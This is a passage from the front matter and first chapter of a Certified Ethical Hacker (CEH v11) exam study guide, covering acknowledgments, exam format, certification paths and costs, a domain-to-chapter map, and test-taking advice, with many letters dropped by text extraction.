This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

ACKNOWLEDGMENTS

When I wrote the irst edition o this book, one o the irst people I gave a copy to was
my mom. She didn’t, and still doesn’t, have a clue what most o it means, but she was
thrilled and kept saying, “You’re an author…,” like I had cured a disease or saved a baby
rom a house ire. At the time I elt weird about it, and I still do. Looking back on the
opportunity I was given—almost out o the blue—by im Green and McGraw Hill,
I just can’t believe the entire thing came to pass. And I’m even more surprised I had
anything to do with it.

hose who know me well understand what is meant when I say I’m just not capable of
doing this. I don’t have the patience or it, I’m not anywhere near the smartest guy in the
room (and right now the only others in this room with me are a plastic Batman, a zombie
garden gnome, and a iki doll), and my Southern brand o English doesn’t always repre-
sent the clearest medium rom which to provide knowledge and insight. Not to mention
I have the attention span o a gnat. It still amazes me it all worked then, and I’m loored
we’re here again with yet another edition.

In previous editions o this book I tried with all that was in me to provide something
useul to CEH candidates, and I’ve attempted to make this edition even better. I’ve
learned a lot (like how having a static study book or an ever-changing certiication
leaves you open to horrendous book review cruelty), and hope this one helps me learn
even more. I’ve put a lot o eort into tidying up loopholes and adding salient inor-
mation rom the ever-growing supply EC-Council avails us with CEH v11. In cases o
success, it was a team eort and credit goes to those who helped me in spite o mysel.
here were many, many olks around me who picked up the slack and corrected—both
technically and grammatically—any writing I’d screwed up. In cases where there was a
misstep or misquote, or something was missed entirely, these areas o ailure are without
question mine and mine alone. But somehow we all pulled it o, and there are thanks
to be had or that.

he McGraw Hill team that works to get these editions out is beyond compare. Seri-
ously, these olks are super smart, exceptionally dedicated to their task, and un to work
with. hey deserve parades, 60 Minutes stories about their lives, and bronze statues o
themselves set somewhere or others to admire and aspire to. Please know how humbled
I am to have had the opportunity to work with you, how appreciative I am o all your
hard work, and how much I admire and respect all o you. You guys rock.

xv

00-FM.indd 15 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CEH Certified Ethical Hacker All-in-One Exam Guide

xvi

his book, and its previous editions, simply would not have been possible without
our technical editor, Brad Horton. I’ve known Brad since 2005, when we both served
time in “the vault” at Marshall Space Flight Center, and I am truly blessed to call him a
riend. I’ve said it beore and I’ll state it again here: Brad is singularly, without doubt, the
most talented technical mind I have ever met in my lie. He has great taste in bourbon
(although not so much with Scotch), roots or the right team, and smacks a gol ball
straighter and truer than most guys I’ve seen—on and o V. He is a loving husband to
his beautiul wie, a great ather to his children, a one-o-a-kind pen tester, and a antastic
team lead. He even plays the piano and other musical instruments like a pro and, I hear,
is a antastic bowler. I hate him. ;-)

Brad’s insights as a pen test lead were laser sharp and provided great odder or more
discussion. Want proo he’s one o the best? I’d be willing to bet none o you reading
this book has ever actually relished a ull critique o your work. But I do. Brad’s edits are
simultaneously witty, humorous, and cutting to the core. I someone had bet me our or
ive years ago that I’d not only enjoy reading critiques o my work but would be looking
orward to them, I would be paying out in spades today. You’re one o the absolute bests,
my riend...or a government worker, anyway. Roll ide.

Lastly, there is no way any o these books could have been started, much less completed,
without the support o my lovely and talented wie, Angie. In addition to the unending
encouragement throughout the entire process, Angie is the greatest contributing editor
I could have ever asked or. Having someone as talented and intelligent as her sitting
close by to run things past, or ask or a review on, was priceless. Not to mention, she’s
adorable. Her insights, help, encouragement, and work while this project was ongoing
sealed the deal. I can’t thank her enough.

00-FM.indd 16 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

INTRODUCTION

Welcome, dear reader! I sincerely hope you’ve ound your way here to this introduction
happy, healthy, and brimming with conidence—or, at the very least, curiosity. I can
see you there, standing in your bookstore lipping through the book or sitting in your
living room clicking through virtual pages at some online retailer. And you’re wonder-
ing whether you’ll buy it—whether this is the book you need or your study guide. You
probably have perused the outline, checked the chapter titles—heck, you may have even
read that great author bio they orced me to write. And now you’ve ound your way to
this, the Introduction. Sure, this intro is supposed to be designed to explain the ins and
outs o the book—to lay out its beauty and craty witticisms in such a way that you just
can’t resist buying it. But I’m also going to take a moment and explain the realities o the
situation and let you know what you’re really getting yoursel into.

his isn’t a walk in the park. Certiied Ethical Hacker (CEH) didn’t gain the reputa-
tion and value it has by being easy to attain. It’s a challenging examination that tests more
than just simple memorization. Its worth has elevated it as one o the top certiications
a technician can attain, and it remains part o DoD 8570’s call or certiication on DoD
networks. In short, this certiication actually means something to employers because they
know the eort it takes to attain it. I you’re not willing to put in the eort, maybe you
should pick up another line o study.

I you’re new to the career ield or you’re curious and want to expand your knowledge,
you may be standing there, with the glow o innocent expectation on your ace, read-
ing this intro and wondering whether this is the book or you. o help you decide, let’s
take a virtual walk over to our entrance sign and have a look. Come on, you’ve seen one
beore—it’s just like the one in ront o the roller coaster reading, “You must be this tall
to enter the ride.” However, this one is just a little dierent. Instead o your height, I’m
interested in your knowledge, and I have a question or two or you. Do you know the
OSI reerence model? What port does SMP use by deault? How about elnet? What
transport protocol (CP or UDP) do they use and why? Can you possibly run something
else over those ports? What’s an RFC?

Why am I asking these questions? Well, my new virtual riend, I’m trying to save
you some agony. Just as you wouldn’t be allowed on a roller coaster that could poten-
tially ling you o into certain agony and/or death, I’m not going to stand by and let
you waltz into something you’re not ready or. I any o the questions I asked seem
otherworldly to you, you need to spend some time studying the mechanics and inner
workings o networking beore attempting this certiication. As brilliantly written as this
little tome is, it is not—nor is any other book—a magic bullet, and i you’re looking or
something you can read one night and become Super-Hacker by daybreak, you’re never
going to ind it.

xvii

00-FM.indd 17 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CEH Certified Ethical Hacker All-in-One Exam Guide

xviii

Don’t get me wrong—go ahead and buy this book. You’ll want it later, and I could use
the sales numbers. All I’m saying is you need to learn the basics beore stepping up to this
plate. I didn’t bother to drill down into the basics in this book because it would have been
20,000 pages long and scared you o right there at the rack without you even picking it
up. Instead, I want you to go learn the “101” stu irst so you can be successul with this
book. It won’t take long, and it’s not rocket science. I was educated in the public school
system o Alabama and didn’t know what cable V or VCR meant until I was nearly a
teenager, and I igured it out—how tough can it be or you? here is plenty in here or
the beginner, though, trust me. I wrote it in the same manner I learned it: simple, easy,
and (ideally) un. his stu isn’t necessarily hard; you just need the basics out o the way
irst. I think you’ll ind, then, this book perect or your goals.

For those o you who have already put your time in and know the basics, I think you’ll
ind this book pleasantly surprising. You’re obviously aware by now that technology isn’t
magic, nor is it necessarily diicult or hard to comprehend—it’s just learning how some-
thing works so you can use it to your advantage. I tried to attack ethical hacking in this
manner, making things as light as possible and laughing a little along the way. But please
be orewarned: you cannot, should not, and will not pass this exam by just reading this
book. Any book that promises that is lying to you. Without hands-on eorts, a lot o
practice, and a whole lot o additional study, you simply will not succeed. Combine this
book with some hands-on practice, and I don’t think you’ll have any trouble at all with
the exam. Read it as a one-stop-shop to certiication, though, and you’ll be leaving the
exam room wondering why you didn’t pass.

here is, o course, one primary goal and ocus o this book—to help you achieve
the title o Certiied Ethical Hacker by passing the version 11 exam. I believe this book
provides you with everything you’ll need to pass the test. However, I’d like to think it
has more to it than that. I hope I also succeed in another goal that’s just as important:
helping you to actually become an employed ethical hacker. No, there is no way someone
can simply pick up a book and magically become a seasoned I security proessional just
by reading it, but I sincerely hope I’ve provided enough real-world insight that you can
saely rely on keeping this book around on your journey out there in the real world.

How to Use This Book
his book covers everything you’ll need to know or EC-Council’s Certiied Ethical
Hacker examination as it stands right now. CEH topics expand seemingly by the day, and
I’m certain you will see the latest hot topic reerenced somewhere in your exam. Hence,
I’ve taken great pains throughout the entirety o this writing to remind you over and over
again to do your own research and keep up with current news.

However, based on inormation derived rom the oicial courseware, discussions with
pen testers and security proessionals actually working, research o topics by your humble
author, and contributions rom the tech editor, I’m pretty conident I have everything
locked down as best I can. Each chapter covers speciic objectives and details or the exam,
as deined by EC-Council (ECC). I’ve done my best to arrange them in a manner that
makes sense, and I hope you see it the same way.

00-FM.indd 18 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

Introduction

xix

Each chapter has several components designed to eectively communicate the
inormation you’ll need or the exam:

• Exam ips are exactly what they sound like. hese are included to point out
an area you need to concentrate on or the exam. No, they are not explicit test
answers. Yes, they will help you ocus your study.

• Sidebars are included in each chapter and are designed to point out inormation,
tips, and stories that will be helpul in your day-to-day responsibilities. Not
to mention, they’re just downright un sometimes. Please note, though, that
although these sidebars provide real-world accounts o interesting pieces o
inormation, some o them reinorce testable material. Don’t just discount them
as simply “neat”—some o the circumstances and tools described in these sidebars
may prove the dierence in correctly answering a question or two on the exam.

• Specially called-out Notes are part o each chapter, too. hese are interesting
tidbits o inormation that are relevant to the discussion and point out extra
inormation. Just as with the sidebars, don’t discount them.

• here are multiple site links provided throughout the book or articles, news
sources, tool locations, and a host o other things. Obviously things change rapidly
out there in the wild, wild world o the Internet, and a URL provided today
may be deunct—or the content within it may get changed—by the time you are
reading this book. I something doesn’t work or you ind a quote or reerence has
been changed rom the original, you may have to do some searching on your own
to ind the material (or use the WayBack machine, which you’ll read about later).

Tools, Sites, and References Disclaimer
All URLs listed in this book were current and live at the time o writing.
McGraw Hill makes no warranty as to the availability o these World Wide Web
or Internet pages. McGraw Hill has not reviewed or approved the accuracy o the
contents o these pages and speciically disclaims any warranties o merchantability
or itness or a particular purpose.

Training and the Examination
Beore I get to anything else, let me be crystal clear: this book will help you pass your test.
I’ve spent a lot o reading and research time to ensure everything EC-Council has asked
you to know beore taking the exam is covered in the book, and I think it’s covered pretty
darn well. However, I again eel the need to caution you: do not use this book as your sole
source of study. his advice goes or any book or any certiication. You simply cannot
expect to pick up a single book and pass a certiication exam. You need practice. You need
hands-on experience, and you need to practice some more. And anyone—any publisher,
author, or riendly book sales clerk partway through a long shit at the local store—who
says otherwise is lying through their teeth.

00-FM.indd 19 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CEH Certified Ethical Hacker All-in-One Exam Guide

xx

Yes, I’m ully conident this book is a great place to start and a good way to guide your
study. Just don’t go into this exam with weird overconidence because “I read the book
so I’m good.” he exam changes oten, as it should, and new material pops up out o
thin air as the days go by. Avail yoursel o everything you can get your hands on, and or
goodness’ sake build a home lab and start perorming some (a lot o ) hands-on practice
with the tools. here is simply no substitute or experience, and I promise you, come test
time, you’ll be glad you put your time in.

Speaking o the test (oicially titled CEH 312-50 as o this writing), it was designed to
provide skills-and-job-roles-based learning, standard-based training modules, and better
industry acceptance using state-o-the-art labs (in the oicial courseware and online).
he exam consists o 125 multiple-choice questions and lasts our hours. A passing score
is, well, different or each exam. See, EC-Council now implements a “cut score” or each
o their questions; the questions go through beta testing, and each is assigned a cut score
to mark the level o diiculty. Should your test include multiple hard questions, your
passing “cut score” may be as low as 60 percent. I you get the easier questions, you
may have to score upward o 78 percent (https://www.eccouncil.org/programs/certiied-
ethical-hacker-ceh/). Delivery o the exam is provided by Pearson VUE and ECC.

hese tidbits should help you:

• Be sure to pay close attention to the Exam ips in the chapters. hey are there
or a reason. And retake the practice exams—both the end-o-chapter exams and
the electronic exams—until you’re sick o them. hey will help, trust me.

• You are allowed to mark, and skip, questions or later review. Go through the
entire exam, answering the ones you know beyond a shadow o a doubt. On the
ones you’re not sure about, choose an answer anyway and mark the question or
urther review (you don’t want to ail the exam because you ran out o time and
had a bunch o questions that didn’t even have an answer chosen). At the end o
each section, go back and look at the ones you’ve marked. Change your answer
only i you are absolutely, 100 percent sure about it.

• You will, with absolute certainty, see a couple o question types that will blow
your mind. One or two will come totally out o let ield. I’ve taken the CEH
exam six times—rom version 5 to the current version (which this book is written
or)—and every single time I’ve seen questions that seemed so ar out o the loop
I wasn’t sure I was taking the right exam. When you see them, don’t panic. Use
deductive reasoning and make your best guess. Almost every single question on
this exam can be whittled down to at least 50/50 odds on a guess. he other type
o question you’ll see that makes you question reality are those using horribly bad
grammar in regard to the English language. Just remember this is an international
organization, and sometimes things don’t translate easily.

• When you encounter code questions on the exam (which show code snippets
or you to answer questions about), pay attention to port numbers. Even i
you’re unsure about what generated the log or code, you can usually spot the
port numbers pretty quickly. his will deinitely help you on a question or two.
Additionally, don’t neglect the plain text on the right side o the code snippet.
It can oten show you what the answer is.

00-FM.indd 20 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

Introduction

xxi

Lastly, uture ethical hacker, regarding an extra addition to this already noteworthy
exam and certiication: it’s just the beginning. Jay Bavisi, EC-Council CEO, created the
next logical step or those holding the written test certiication—a means to prove skills
and abilities in a practical exam setting known as the CEH Practical Exam. It’s a six-hour
exam that presents 20 practical challenges or candidates to attempt, administered in the
EC-Council iLabs Cyber Range test ormat (https://ilabs.eccouncil.org/cyber-range/).
Passing score is listed at 70 percent, but the actual scoring o the challenge labs (i.e., how
one attains 70 percent) isn’t noted anywhere I can ind, as o this writing. Ater comple-
tion o the exam and practical, candidates are bestowed the title CEH Master. Per the
EC-Council website, “CEH is meant to be the oundation or anyone seeking to be an
Ethical Hacker. he CEH Practical Exam was developed to give Ethical Hackers the
chance to prove their Ethical Hacking skills and abilities.”

Oh, and one more un nugget to chew in chasing all this down should appeal to any
ans o the book Ready Player One: the op 10 perormers in both CEH and CEH Practical
exams will be showcased on the CEH Master Global Ethical Hacking Leader Board.

Objectives
In addition to test tips and how to get certiied, one o the questions I get asked most
oten is, “Hey, Matt, what’s on the test?” Ater noting the myriad reasons why I cannot
and should not provide exact test questions and answers (ethics and nondisclosure agree-
ments and such), I usually respond with, “Everything in this book. And a little more.”
Now I know some o you are reading this and saying, “Wait a minute… his is supposed
to be an All-in-One exam guide. What do you mean with the “And a little more” addition
there? I thought you covered everything in this book? Let me explain.

First, I’m a quick learner, and the reviews and responses rom the irst ew editions o
this book lead me to an irreutable truth: no static book ever written can cover everything
EC-Council decides to throw into their exam queue. A couple months—heck, even days—
ater publication, EC-Council might decide to insert questions regarding some inane attack
rom the past, or about something that just happened (such as any zero-day issues your
intrepid author had no knowledge o beore writing/submitting to publication). It’s just
the nature o certiication exams: some o it is just going to be new, no matter what training
source you use. And, yes, that includes EC-Council’s own oicial course material as well.

00-FM.indd 21 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CEH Certified Ethical Hacker All-in-One Exam Guide

xxii

Second, and to the more interesting question o insight into editor–author relation-
ships at McGraw Hill, a previous editor had to beat on me quite a bit because we disagreed
on including an objectives map in this book. he editor rightly noted that an objectives
map helps candidates ocus their study as well as helps instructors create lesson plans and
classroom schedules. My argument centered on a couple o things. First is the unavoidable
act that EC-Council’s objectives simply don’t exist; at least not in a clearly worded ormat
with indication o what level o knowledge would be needed and/or tested or each one.
Secondly, EC-Council was supposed to be moving away rom versions altogether and
adopting the continuing proessional education model that most other certiication pro-
viders use. Which means EC-Council may just up and change their objectives any time
they feel like it—without releasing another “version.”

So, a conundrum—which we solved and present now to you. he ollowing
courseware map or this book compares where you will ind EC-Council’s coverage
in our little oering here. Additionally, EC-Council deines nine domains or their
current CEH certiication (https://www.eccouncil.org/wp-content/uploads/2021/01/
CEH-Exam-Blueprint-v4.0.pd ). As noted earlier, the speciic objectives (or rather,
sub-objectives) covered within each domain change rapidly, but the coverage on the
exam broken down by percentages may help you in your study. Please check the link
beore your exam to see i EC-Council has made any changes.

CEH Exam 312-50

CEHv11 Subdomains/ All-in-One
CEHv11 Domains Courseware Chapters Coverage

1. Information Security and Introduction to Ethical Hacking Chapter 1
Ethical Hacking Overview

2. Reconnaissance Techniques Footprinting and Reconnaissance Chapter 2

Scanning Networks Chapter 3

Enumeration Chapter 3

3. System Hacking Phases and Vulnerability Analysis Chapter 5
Attack Techniques

System Hacking Chapter 5

Malware Threats Chapter 10

4. Network and Perimeter Hacking Sniing Chapter 4

Social Engineering Chapter 12

Denial-o-Service Chapter 10

Session Hijacking Chapter 10

Evading IDS, Firewalls, and Honeypots Chapter 4

5. Web Application Hacking Hacking Web Servers Chapter 6

Hacking Web Applications Chapter 6

SQL Injection Chapter 6

6. Wireless Network Hacking Hacking Wireless Networks Chapter 7

00-FM.indd 22 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

Introduction

xxiii

CEH Exam 312-50

CEHv11 Subdomains/ All-in-One
CEHv11 Domains Courseware Chapters Coverage

7. Mobile Platform, IoT, and OT Hacking Hacking Mobile Platorms Chapter 8

IoT and OT Hacking Chapter 8

8. Cloud Computing Cloud Computing Chapter 9

9. Cryptography Cryptography Chapter 11

So there you have it, ladies and gentlemen. Hopeully this helps in preparing your
study/classroom and calms any ears that I may have let something out.

The Certification
So, you’ve studied, you’ve prepped, and you think you’re ready to become CEH certiied.
Usually most olks looking or this certiication believe their next step is simply to go
take a test, and or years (as is the case or most other certiications) that was the truth.
However, times change, and certiication providers are always looking or a way to add
more worth to their title. EC-Council is no dierent, and it has changed things just a bit
or candidates.

When you apply or the certiication, there are a couple o things EC-Council asks
or to protect the integrity o the program. First is that prior to attending this course,
you will be asked to sign an agreement stating that you will not use your newly acquired
skills or illegal or malicious attacks and you will not use such tools in an attempt to
compromise any computer system, and to indemniy EC-Council with respect to the use
or misuse o these tools, regardless o intent. Second is some orm o veriication you’re
qualiied to be in this raternity—that is, that you’ve been working the job long enough
to know what’s going on, or that you’ve completed appropriate training (in the eyes o
EC-Council anyway) to make up or that.

here are two ways or a candidate to attain CEH certiication: with training or
using only sel-study. he training option is pretty straightorward: you must attend
an EC-Council–approved CEH training class beore attempting the exam. And they
really, really, really want you to attend their training class. Per the site (https://iclass
.eccouncil.org/), training options include the ollowing:

• Live, online, instructor-led hese classes are oered by many ailiates
EC-Council has certiied to provide the training. hey oer the oicial courseware
in one o two methods: a standard classroom setting or via an “online-live” training
class you can view rom anywhere. Both oerings have an ECC-certiied instructor
leading the way and as o this writing costs $2,895 per seat.

• Client site EC-Council can also arrange or a class at your location, provided
you’re willing to pay or it, o course. Costs or that depend on your organization.

00-FM.indd 23 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

CEH Certified Ethical Hacker All-in-One Exam Guide

xxiv

As or doing it on your own, a couple methods are available:

• iClass In this option, you pay or the oicial courseware and prerecorded
oerings, along with the labs used or the class. his allows you to work through
the stu on your own, without an instructor. Cost as o this writing is $1,899.

• Self-study I you want to study on your own and don’t care about the class at
all (that is, you’ve been doing this or a while and don’t see the value o going to a
class to have someone teach you what you already know), you can simply buy the
courseware or $850 and study on your own.

One more quick note on training: it’s a lot better than it used to be. EC-Council–
certiied classes and instructors are top notch, and the new curriculum isn’t just sitting
in a classroom while someone reads slides and provides you test questions to practice on.
Now the class itsel actually requires completion o multiple Break-the-Code Challenges,
“ranging across 4 levels o complexity covering 18 attack vectors, including the OWASP
op 10.” So coming out o the classroom you’ve not only seen what you’re supposed to
know, you’ve done it!

Once you attend training, you can register or and attempt the exam with no addi-
tional cost or steps required. As a matter o act, the cost or the exam is usually part o
the course pricing. I you attempt sel-study, however, there are some additional require-
ments, detailed here, straight rom EC-Council:

In order to be considered or the EC-Council certiication exam without attending
oicial training, a candidate must:

• Hold a CEH certiication o version 1 to 7.

• Have a minimum o two years work experience in InoSec domain.

• Remit a nonreundable eligibility application ee o $100.

• Submit a completed Exam Eligibility Application Form ound here: https://cert
.eccouncil.org/Exam-Eligibility-Form.html. I urther inormation is requested
rom the applicant ater the application is submitted and 90 days pass with no
response rom the applicant, the application will be automatically rejected and
a new orm will have to be submitted (on average an application processing
time is between ive to ten working days). On the application, there is a section
or the applicant to list a supervisor or department lead who will act as their
veriier. EC-Council reaches out to the listed veriier to conirm the applicant’s
experience. I the application is approved, the applicant will be sent instructions
on purchasing a voucher rom EC-Council directly. EC-Council will then send
the candidate the eligibility code and the voucher code which candidate can use
to register and schedule the test. I application is not approved, the application
ee o $100 will not be reunded. he approved application is valid or three
months rom the date o approval, so the candidate must purchase a voucher
within three months. Ater the voucher codes are released, the applicant has
one year to use the codes.

00-FM.indd 24 14/09/21 4:10 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / FM

Introduction

xxv

And there you have it, dear reader. Sure, there are a couple o additional hoops to
jump through or CEH using sel-study, but it’s the best option, cost-wise. From the
perspective o someone who has hired many employees in the security world, I honestly
believe it may be the better option all around: anyone can attend a class, but those who
sel-study need to have a sponsor to veriy they have the appropriate experience. It’s well
worth the extra step, in my humble opinion.

Finally, thank you or picking up this book. I’ve been blown away by the response to
previous editions, and humbled beyond words by all o it. I sincerely hope your exam
goes well, and I wish you the absolute best in your upcoming career. Here’s hoping I see
you out there, somewhere and sometime!

God bless.

00-FM.indd 25 14/09/21 4:10 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CHAPTER

Getting Started: 1
Essential Knowledge
In this chapter you will

• Identiy components o TCP/IP computer networking
• Understand basic elements o inormation security
• Understand incident management steps
• Identiy undamentals o security policies
• Identiy essential terminology associated with ethical hacking
• Deine ethical hacker and classiications o hackers
• Describe the ive stages o ethical hacking
• Deine the types o system attacks
• Identiy laws, acts, and standards aecting IT security
• Identiy Cyber Kill Chain methodology terms

A couple years back, my ISP point-of-presence router, nestled in the comm-closet-like
area I’d lovingly built just for such items of IT interest, decided it had had enough of
serving the humans and went rogue on me. It was subtle at first—a stream dropped here,
a choppy communication session there—but it quickly became clear Skynet wasn’t going
to play nicely, and a scorched-earth policy wasn’t off the table.

After battling with everything for a while and narrowing down the culprit, I called the
handy help desk line to get a new router ordered and delivered for me to install myself,
or to get a friendly in-home visit to take the old one and replace it. After answering the
phone and taking a couple of basic and perfectly reasonable pieces of information, the
friendly help desk employee started asking me what I considered to be ridiculous ques-
tions: “Is your power on? Is your computer connected via a cable or wireless? Is your
wireless card activated, because sometimes those things get turned off in airplane mode?”
And so on. I played along for a little while. I mean, look, I get it: they have to ask those
questions. But after 10 or 15 minutes of dealing with it I lost patience and just told the
guy what was wrong. He paused, thanked me, and continued reading the scroll of ques-
tions no doubt rolling across his screen from the “Customer Says No Internet” file.

1

01-ch01.indd 1 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

2

I survived the gauntlet and finally got a new router ordered, which was delivered the
very next day at 8:30 in the morning. Everything finally worked out, but the whole
experience came to mind as I sat down to start the latest edition of this book. I got to
looking at the chapters from the previous edition and thought to myself, “What were
you thinking? Why were you telling them about networking and the OSI model? You’re
the help desk guy here.”

Why? Because I have to. I’ve promised to cover everything here (at least as much as
I can, given the moving target this certification presents), and although you shouldn’t
jump into study material for the exam without already knowing the basics, we’re all
human and some of us will. But don’t worry, dear reader: I’ve winnowed out some of
the networking basics from past editions. I did retain a fantastic explanation of the OSI
reference model, what PDUs are at what level, and why you should care, even though
I’m pretty sure you know this already. I’m going to do my best to keep it better focused
for you and your study. This chapter still includes some inanely boring and mundane
information that is probably as exciting as that laundry you have piled up waiting to go
into the machine, but it has to be said, and you’re the one to hear it. We’ll cover the many
terms you’ll need to know, including what an ethical hacker is supposed to be, and maybe
even cover a couple terms you don’t know.

Security 101
If you’re going to start a journey toward an ethical hacking certification, it should follow
that the fundamental definitions and terminology involved with security should be right
at the starting line. We’re not going to cover everything involved in IT security here—it’s
simply too large a topic, we don’t have space, and you won’t be tested on every ele-
ment anyway—but there is a foundation of 101-level knowledge you should have before
wading out of the shallow end. This chapter covers the terms you’ll need to know to
sound intelligent when discussing security matters with other folks. And, perhaps just as
importantly, we’ll cover some basics of TCP/IP networking because, after all, if you don’t
understand the language, how are you going to work your way into the conversation?

Essentials
Before we can get into what a hacker is and how you become one in our romp through
the introductory topics here, there are a couple things I need to get out of the way.
First, even though I covered most of this in that Shakespearean introduction for the
book, I want to talk a little bit about this exam and what you need to know, and do, to
pass it. Why repeat myself? Because after reading reviews, comments, and e-mails from
our first few outings, it has come to my attention almost none of you actually read the
introduction. I don’t blame you; I skip it too on most certification study books, just
going right for the meat. But there’s good stuff there you really need to know before
reading further, so I’ll do a quick rundown for you up front.

Second, we need to cover some security and network basics that will help you on your
exam. Some of this section is simply basic memorization, some of it makes perfect com-
mon sense, and some of it is, or should be, just plain easy. You’re really supposed to know

01-ch01.indd 2 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

3

this already, and you’ll see this stuff again and again throughout this book, but it’s truly
bedrock information and I would be remiss if I didn’t at least provide a jumping-off point.

The Exam
Are you sitting down? Is your heart healthy? I don’t want to distress you with this shock-
ing revelation I’m about to throw out, so if you need a moment, go pour a bourbon
(another refrain you’ll see referenced throughout this book) and get calm before you read
further. Are you ready? The CEH version 11 exam is difficult, and despite hours (days,
weeks) of study and multiple study sources, you may still come up against a version of
the exam that leaves you feeling like you’ve been hit by a truck.

I know. A guy writing and selling a study book just told you it won’t be enough. Trust
me when I say it, though, I’m not kidding. Of course this will be a good study reference.
Of course you can learn something from it if you really want to. Of course I did everything
I could to make it as up to date and comprehensive as possible. But if you’re under the
insane assumption this is a magic ticket, that somehow written word from April 2021 is
going to magically hit the word-for-word reference on a specific test question in whatever
time frame/year you’re reading this, I sincerely encourage you to find some professional
help before the furniture starts talking to you and the cat starts making sense. Those of
you looking for exact test questions and answers that you can memorize to pass the exam
will not find it in this publication, nor any other. For the rest of you, those who want a
little focused attention to prepare the right way for the exam and those looking to learn
what it really means to be an ethical hacker, let’s get going with your test basics.

First, if you’ve never taken a certification-level exam, I wouldn’t recommend the CEH
exam as your first experience. It’s tough enough to pass without all the distractions and
nerves involved in your first walkthrough. When you do arrive for your exam, you usually
check in with a friendly test proctor or receptionist, sign a few forms, and get funneled
off to your testing room. Every time I’ve gone it has been a smallish office or a closed-in
cubicle, with a single monitor staring at me ominously. You’ll click START and begin
whizzing through questions one by one, clicking the circle to select the best answer(s) or
clicking and dragging definitions to the correct section. At the end there’s a SUBMIT
button, which you will click and then enter a break in the time-space continuum—
because the next 10 seconds will seem like the longest of your life. In fact, it’ll seem like
an eternity, where things have slowed down so much you can actually watch the refresh
rate on the monitor and notice the cycles of AC current flowing through the office lamps.
When the results page finally appears, it’s a moment of overwhelming relief or one of
surreal numbness.

If you pass, none of the study material matters and, frankly, you’ll almost immediately
start dumping the stored memory from your neurons. If you don’t pass, everything mat-
ters. You’ll race to the car and start marking down everything you can remember so you
can study better next time. You’ll fly to social media and the Internet to discuss what
went wrong and to lambast anything you didn’t find useful in preparation. And you’ll
almost certainly look for something, someone to blame. Trust me, don’t do this.

Everything you do in preparation for this exam should be done to make you a better
ethical hacker, not to pass a test. If you prepare as if this is your job, if you take everything
you can use for study material and try to learn instead of memorize, you’ll be better off,

01-ch01.indd 3 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

CEH Certified Ethical Hacker All-in-One Exam Guide

4

pass or fail. And, consequentially, I guarantee if you prepare this way your odds of passing
any version of the test that comes out go up astronomically.

The test itself? Well, there are some tips and tricks that can help. I highly recommend
you go back to the introduction and read the sections “Training and the Examination”
and “The Certification.” They’ll help you. A lot. Here are some other tips that may help:

• Do not let real life trump EC-Council’s view of it. There will be several instances
somewhere along your study and eventual exam life where you will say, aloud,
“That’s not what happens in the real world! Anyone claiming that would be stuffed
in a locker and sprayed head to toe with shaving cream!” Trust me when I say this:
real life and a certification exam do not necessarily always directly correspond. To
prepare for some of these questions, you’ll need to study and learn what you need
for the exam, knowing full well it’s different in the real world. If you don’t know
what I mean by this, ask someone who has been working in the field for a while if
they think social engineering is passive, as EC-Council suggests.

• Go to the bathroom before you enter your test room. Even if you don’t have to.
Because, trust me, you do.

• Use time to your advantage. The exam is split into sections, with a time frame
set up for each one. You can work and review inside the section all you want, but
once you pass through it you can’t go back. And if you fly through a section, you
don’t get more time on the next one. Take your time and review appropriately.

• Make use of the paper and pencil/pen the friendly test proctor provides you.
As soon as you sit down, before you click START on the ominous test monitor
display, start writing down everything from your head onto the paper provided.
I would recommend reviewing just before you walk into the test center those
sections of information you’re having the most trouble remembering. When you
get to your test room, write them down immediately. That way, when you’re
losing your mind a third of the way through the exam and start panicking that
you can’t remember what an XMAS scan returns on a closed port, you’ll have
a reference. And trust me, having it there makes it easier for you to recall the
information, even if you never look at it.

• Trust your instincts. When you do question review, unless you absolutely,
positively, beyond any shadow of a doubt know you initially marked the wrong
answer, do not change it.

• Take the questions at face value. I know many people who don’t do well on exams
because they’re trying to figure out what the test writer meant when putting the
question together. Don’t read into a question; just answer it and move on.

• Schedule your exam sooner than you think you’ll be ready for it. I say this
because I know people who say, “I’m going to study for six months and then
I’ll be ready to take the exam.” Six months pass and they’re still sitting there,
studying and preparing. If you do not put it on the calendar to make yourself
prepare, you’ll never take it, because you’ll never be ready.

01-ch01.indd 4 14/09/21 3:52 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 1

Chapter 1: Getting Started: Essential Knowledge

5

Again, it’s my intention that everyone reading this book and using it as a valuable
resource in preparation for the exam will attain the certification, but I can’t guarantee you
